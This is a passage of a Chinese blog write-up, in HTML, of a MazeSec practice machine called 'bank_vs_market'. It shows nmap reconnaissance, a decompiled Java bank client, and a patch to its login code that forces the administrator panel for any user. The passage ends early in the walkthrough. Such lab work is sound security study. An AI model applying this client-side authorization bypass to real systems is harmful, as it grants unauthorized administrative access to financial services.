@@ -1,0 +1,750 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="あてもなく彷徨う蝉の群れに、向着连目的地都没有彷徨着的蝉群水も無くなり揺れ出す視界に、向着连水面都静止了的视野里迫り狂う鬼たちの怒号に、向着狂乱的众鬼的怒号バカみたいにはしゃぎあいふと君けナイフを取った。像笨蛋一样欢闹着 直到你突然掏出了小刀。  靶机ip：192.168.56.215 难度：中等——困难 涉及内容：java代码审计，jar反编译，逻辑漏洞利用，pickle反序列化漏洞利用，jav">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mazesec靶机复盘-bank_vs_market">
+<meta property="og:url" content="http://example.com/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="あてもなく彷徨う蝉の群れに、向着连目的地都没有彷徨着的蝉群水も無くなり揺れ出す視界に、向着连水面都静止了的视野里迫り狂う鬼たちの怒号に、向着狂乱的众鬼的怒号バカみたいにはしゃぎあいふと君けナイフを取った。像笨蛋一样欢闹着 直到你突然掏出了小刀。  靶机ip：192.168.56.215 难度：中等——困难 涉及内容：java代码审计，jar反编译，逻辑漏洞利用，pickle反序列化漏洞利用，jav">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_zcRrCiMumN.png">
+<meta property="og:image" content="http://example.com/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_hwWSOhHL34.png">
+<meta property="og:image" content="http://example.com/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_waldfSAKn2.png">
+<meta property="og:image" content="http://example.com/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_mtfwqvmKlo.png">
+<meta property="og:image" content="http://example.com/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/java_hOqDu63Lz8.png">
+<meta property="og:image" content="http://example.com/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_yGsYCyglbn.png">
+<meta property="og:image" content="http://example.com/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_szxmPYWN62.png">
+<meta property="og:image" content="http://example.com/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_6zLuWVLzUG.png">
+<meta property="og:image" content="http://example.com/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_lyYlWWmbLA.png">
+<meta property="og:image" content="http://example.com/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_feBfdaGmbP.png">
+<meta property="og:image" content="http://example.com/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_IKFBebH6YG.png">
+<meta property="og:image" content="http://example.com/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_42rIxbUKWw.png">
+<meta property="og:image" content="http://example.com/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_P9zVWOwvtR.png">
+<meta property="article:published_time" content="2026-01-13T06:06:16.000Z">
+<meta property="article:modified_time" content="2026-01-13T08:50:36.003Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="复盘">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_zcRrCiMumN.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>mazesec靶机复盘-bank_vs_market - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"busuanzi":{"enable":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="mazesec靶机复盘-bank_vs_market"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-01-13 14:06" pubdate>
+          January 13, 2026 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.2k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          19 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">mazesec靶机复盘-bank_vs_market</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>あてもなく彷徨う蝉の群れに、<br>向着连目的地都没有彷徨着的蝉群<br>水も無くなり揺れ出す視界に、<br>向着连水面都静止了的视野里<br>迫り狂う鬼たちの怒号に、<br>向着狂乱的众鬼的怒号<br>バカみたいにはしゃぎあいふと君けナイフを取った。<br>像笨蛋一样欢闹着 直到你突然掏出了小刀。</p>
+<hr>
+<p>靶机ip：192.168.56.215</p>
+<p>难度：中等——困难</p>
+<p>涉及内容：java代码审计，jar反编译，逻辑漏洞利用，pickle反序列化漏洞利用，java反序列化利用</p>
+<hr>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap全端口扫描</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kaada)-[<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>kali<span class="hljs-operator">/</span>Desktop]<br>└─<span class="hljs-comment"># nmap -p- -Pn 192.168.56.215</span><br>Starting Nmap <span class="hljs-number">7.95</span> ( https:<span class="hljs-symbol">//nmap.org</span> ) at <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>1-<span class="hljs-number">13</span> <span class="hljs-number">01</span>:<span class="hljs-number">09</span> EST<br><span class="hljs-params">Stats:</span> <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">26</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing SYN Stealth Scan<br>SYN Stealth Scan <span class="hljs-params">Timing:</span> About <span class="hljs-number">16.51</span>% done; <span class="hljs-params">ETC:</span> <span class="hljs-number">01</span>:<span class="hljs-number">12</span> (<span class="hljs-number">0</span>:<span class="hljs-number">02</span>:<span class="hljs-number">17</span> remaining)<br><span class="hljs-params">Stats:</span> <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">53</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing SYN Stealth Scan<br>SYN Stealth Scan <span class="hljs-params">Timing:</span> About <span class="hljs-number">41.33</span>% done; <span class="hljs-params">ETC:</span> <span class="hljs-number">01</span>:<span class="hljs-number">12</span> (<span class="hljs-number">0</span>:<span class="hljs-number">01</span>:<span class="hljs-number">17</span> remaining)<br><span class="hljs-params">Stats:</span> <span class="hljs-number">0</span>:<span class="hljs-number">01</span>:<span class="hljs-number">11</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing SYN Stealth Scan<br>SYN Stealth Scan <span class="hljs-params">Timing:</span> About <span class="hljs-number">60.45</span>% done; <span class="hljs-params">ETC:</span> <span class="hljs-number">01</span>:<span class="hljs-number">11</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">47</span> remaining)<br>Nmap scan report for <span class="hljs-number">192.168</span>.<span class="hljs-number">56.215</span><br>Host is up (<span class="hljs-number">0.00059</span>s latency).<br>Not <span class="hljs-params">shown:</span> <span class="hljs-number">65530</span> filtered tcp ports (no-response)<br>PORT      STATE  SERVICE<br><span class="hljs-number">22</span><span class="hljs-symbol">/tcp</span>    open   ssh<br><span class="hljs-number">80</span><span class="hljs-symbol">/tcp</span>    open   http<br><span class="hljs-number">3306</span><span class="hljs-symbol">/tcp</span>  closed mysql<br><span class="hljs-number">8000</span><span class="hljs-symbol">/tcp</span>  open   http-alt<br><span class="hljs-number">14646</span><span class="hljs-symbol">/tcp</span> open   unknown<br>MAC <span class="hljs-params">Address:</span> <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:<span class="hljs-number">3</span>C:A4:<span class="hljs-number">74</span> (PCS Systemtechnik<span class="hljs-symbol">/Oracle</span> VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-params">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">104.73</span> seconds<br><br></code></pre></td></tr></table></figure>
+
+<p>nmap细节探测</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kaada)-[<span class="hljs-operator">/</span>home<span class="hljs-operator">/</span>kali<span class="hljs-operator">/</span>Desktop]<br>└─<span class="hljs-comment"># nmap -sV -sC -A -Pn -p22,80,3306,8000,14646 192.168.56.215</span><br>Starting Nmap <span class="hljs-number">7.95</span> ( https:<span class="hljs-symbol">//nmap.org</span> ) at <span class="hljs-number">202</span>6-<span class="hljs-number">0</span>1-<span class="hljs-number">13</span> <span class="hljs-number">01</span>:<span class="hljs-number">12</span> EST<br>Nmap scan report for <span class="hljs-number">192.168</span>.<span class="hljs-number">56.215</span><br>Host is up (<span class="hljs-number">0.00073</span>s latency).<br><br>PORT      STATE  SERVICE VERSION<br><span class="hljs-number">22</span><span class="hljs-symbol">/tcp</span>    open   ssh     OpenSSH <span class="hljs-number">8.4</span>p1 Debian <span class="hljs-number">5</span><span class="hljs-operator">+</span>deb11u3 (protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-params">ssh-hostkey:</span> <br>|   <span class="hljs-number">3072</span> f6:a3:b6:<span class="hljs-number">78</span>:c4:<span class="hljs-number">62</span>:af:<span class="hljs-number">44</span>:bb:<span class="hljs-number">1</span>a:a0:<span class="hljs-number">0</span>c:<span class="hljs-number">08</span>:<span class="hljs-number">6</span>b:<span class="hljs-number">98</span>:f7 (RSA)<br>|   <span class="hljs-number">256</span> bb:e8:a2:<span class="hljs-number">31</span>:d4:<span class="hljs-number">05</span>:a9:c9:<span class="hljs-number">31</span>:ff:<span class="hljs-number">62</span>:f6:<span class="hljs-number">32</span>:<span class="hljs-number">84</span>:<span class="hljs-number">21</span>:<span class="hljs-number">9</span>d (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">3</span>b:ae:<span class="hljs-number">34</span>:<span class="hljs-number">64</span>:<span class="hljs-number">4</span>f:a5:<span class="hljs-number">75</span>:b9:<span class="hljs-number">4</span>a:b9:<span class="hljs-number">81</span>:f9:<span class="hljs-number">89</span>:<span class="hljs-number">76</span>:<span class="hljs-number">99</span>:eb (ED25519)<br><span class="hljs-number">80</span><span class="hljs-symbol">/tcp</span>    open   http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">62</span> ((Debian))<br>|<span class="hljs-params">_http-server-header:</span> Apache<span class="hljs-symbol">/2.4.62</span> (Debian)<br>|<span class="hljs-params">_http-title:</span> MazeSec Bank<br><span class="hljs-number">3306</span><span class="hljs-symbol">/tcp</span>  closed mysql<br><span class="hljs-number">8000</span><span class="hljs-symbol">/tcp</span>  open   http    WSGIServer <span class="hljs-number">0.2</span> (Python <span class="hljs-number">3.9</span>.<span class="hljs-number">2</span>)<br>| <span class="hljs-params">http-title:</span> \xE7\x94\xA8\xE6\x88\xB7\xE7\x99\xBB\xE5\xBD\x95 <span class="hljs-operator">-</span> \xE5\xB8\x82\xE5\x9C\xBA\xE7\xB3\xBB\xE7\xBB\x9F<br>|_Requested resource was <span class="hljs-operator">/</span>login<span class="hljs-operator">/</span><span class="hljs-operator">?</span>next<span class="hljs-operator">=</span><span class="hljs-symbol">/</span><br><span class="hljs-number">14646</span><span class="hljs-symbol">/tcp</span> open   unknown<br>MAC <span class="hljs-params">Address:</span> <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:<span class="hljs-number">3</span>C:A4:<span class="hljs-number">74</span> (PCS Systemtechnik<span class="hljs-symbol">/Oracle</span> VirtualBox virtual NIC)<br>Aggressive OS <span class="hljs-params">guesses:</span> Linux <span class="hljs-number">5.0</span> <span class="hljs-operator">-</span> <span class="hljs-number">5.14</span> (<span class="hljs-number">98</span>%), MikroTik RouterOS <span class="hljs-number">7.2</span> <span class="hljs-operator">-</span> <span class="hljs-number">7.5</span> (Linux <span class="hljs-number">5.6</span>.<span class="hljs-number">3</span>) (<span class="hljs-number">98</span>%), Linux <span class="hljs-number">4.15</span> <span class="hljs-operator">-</span> <span class="hljs-number">5.19</span> (<span class="hljs-number">94</span>%), OpenWrt <span class="hljs-number">21.02</span> (Linux <span class="hljs-number">5.4</span>) (<span class="hljs-number">94</span>%), Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">32</span> <span class="hljs-operator">-</span> <span class="hljs-number">3.13</span> (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">5.1</span> <span class="hljs-operator">-</span> <span class="hljs-number">5.15</span> (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">6.0</span> (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">39</span> (<span class="hljs-number">93</span>%), OpenWrt <span class="hljs-number">22.03</span> (Linux <span class="hljs-number">5.10</span>) (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">4.19</span> (<span class="hljs-number">92</span>%)<br>No exact OS matches for host (test conditions non-ideal).<br>Network <span class="hljs-params">Distance:</span> <span class="hljs-number">1</span> hop<br>Service <span class="hljs-params">Info:</span> <span class="hljs-params">OS:</span> Linux; <span class="hljs-params">CPE:</span> cpe:<span class="hljs-operator">/</span>o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br><span class="hljs-number">1</span>   <span class="hljs-number">0.73</span> ms <span class="hljs-number">192.168</span>.<span class="hljs-number">56.215</span><br><br>OS and Service detection performed. Please report any incorrect results at https:<span class="hljs-operator">//</span>nmap.org<span class="hljs-operator">/</span>submit<span class="hljs-symbol">/</span> .<br>Nmap <span class="hljs-params">done:</span> <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">15.10</span> seconds<br><br></code></pre></td></tr></table></figure>
+
+<p>访问80端口，发现是一个银行的界面，提示我们下载客户端</p>
+<p><img src="/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_zcRrCiMumN.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_hwWSOhHL34.png" srcset="/img/loading.gif" lazyload></p>
+<p>现在得知14646应为银行服务端开放端口。</p>
+<p>连接成功后提示我们输入用户名和密码，选择注册一个账户。</p>
+<p><img src="/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_waldfSAKn2.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功登录后进入到开户界面，开一个账户。</p>
+<p><img src="/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_mtfwqvmKlo.png" srcset="/img/loading.gif" lazyload></p>
+<p>之后存款，闭眼按零，看看审批流程究竟是怎么回事。</p>
+<p>使用jadx反编译该客户端。</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">private</span> void login() throws IOException &#123;<br>       String username = <span class="hljs-keyword">this</span>.usernameField.getText().trim();<br>       String password = new String(<span class="hljs-keyword">this</span>.passwordField.getPassword());<br>       <span class="hljs-keyword">if</span> (username.isEmpty() || password.isEmpty()) &#123;<br>           JOptionPane.showMessageDialog(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;请输入用户名和密码！&quot;</span>, <span class="hljs-string">&quot;提示&quot;</span>, <span class="hljs-number">2</span>);<br>           <span class="hljs-keyword">return</span>;<br>       &#125;<br>       <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.client.isConnected()) &#123;<br>           JOptionPane.showMessageDialog(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;与服务器的连接已断开！&quot;</span>, <span class="hljs-string">&quot;错误&quot;</span>, <span class="hljs-number">0</span>);<br>           <span class="hljs-keyword">return</span>;<br>       &#125;<br>       <span class="hljs-keyword">try</span> &#123;<br>           User user = (User) <span class="hljs-keyword">this</span>.client.sendRequest(<span class="hljs-string">&quot;LOGIN&quot;</span>, username, password);<br>           <span class="hljs-keyword">if</span> (user != <span class="hljs-literal">null</span>) &#123;<br>               JOptionPane.showMessageDialog(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;登录成功！&quot;</span>, <span class="hljs-string">&quot;提示&quot;</span>, <span class="hljs-number">1</span>);<br>               <span class="hljs-keyword">if</span> (user.getUserType() == User.UserType.ADMIN) &#123;<br>                   new AdminFrame(<span class="hljs-keyword">this</span>.client, user).setVisible(<span class="hljs-literal">true</span>);<br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   new CustomerFrame(<span class="hljs-keyword">this</span>.client, user).setVisible(<span class="hljs-literal">true</span>);<br>               &#125;<br>               dispose();<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               JOptionPane.showMessageDialog(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;用户名或密码错误！&quot;</span>, <span class="hljs-string">&quot;错误&quot;</span>, <span class="hljs-number">0</span>);<br>               <span class="hljs-keyword">this</span>.client.disconnect();<br>           &#125;<br>       &#125; <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>           ex.printStackTrace();<br>           JOptionPane.showMessageDialog(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;登录失败：&quot;</span> + ex.getMessage(), <span class="hljs-string">&quot;错误&quot;</span>, <span class="hljs-number">0</span>);<br>           <span class="hljs-keyword">this</span>.client.disconnect();<br>       &#125;<br>   &#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>主要的漏洞点在这里，在本地，验证逻辑是如果用户是管理员，那么打开管理员面板，反之打开用户面板。</p>
+<p>那么可以修改代码，改成无论是谁都打开管理员面板。</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">try</span> &#123;<br>            User user = (User) <span class="hljs-keyword">this</span>.client.sendRequest(<span class="hljs-string">&quot;LOGIN&quot;</span>, username, password);<br>            <span class="hljs-keyword">if</span> (user != <span class="hljs-literal">null</span>) &#123;<br>                JOptionPane.showMessageDialog(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;登录成功！(强制管理员模式)&quot;</span>, <span class="hljs-string">&quot;提示&quot;</span>, <span class="hljs-number">1</span>);<br>                <br>                <span class="hljs-comment">// ========================================================</span><br>                <span class="hljs-comment">// 修改重点：无论 UserType 是什么，都打开 AdminFrame</span><br>                <span class="hljs-comment">// ========================================================</span><br>                new AdminFrame(<span class="hljs-keyword">this</span>.client, user).setVisible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-comment">// ========================================================</span><br>                <br>                dispose();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                JOptionPane.showMessageDialog(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;用户名或密码错误！&quot;</span>, <span class="hljs-string">&quot;错误&quot;</span>, <span class="hljs-number">0</span>);<br>                <span class="hljs-comment">// 为了用户体验，建议不要在这里断开连接，保留重试机会</span><br>                <span class="hljs-comment">// this.client.disconnect(); </span><br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure>
+
+<p>用recaf修改代码ctrl+s保存代码后导出jar包并保存，同时开两个jar包。</p>
+<p><img src="/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/java_hOqDu63Lz8.png" srcset="/img/loading.gif" lazyload></p>
+<p>现在我们已经是管理员了。</p>
+<p><img src="/2026/01/13/mazesec%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98-bank-vs-market/vmware_yGsYCyglbn.png" srcset="/img/loading.gif" lazyload></p>
+<p>选择一个闭眼按零的存款申请</p>
